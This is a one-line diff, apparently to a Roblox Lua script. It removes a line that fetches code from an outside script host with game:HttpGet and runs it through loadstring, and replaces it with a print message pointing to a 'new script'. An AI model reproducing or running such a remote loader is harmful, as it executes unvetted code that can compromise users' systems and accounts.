@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://api.obscuravm.com/scripts/3733479976875754767"))()
+print("Get The New Script")
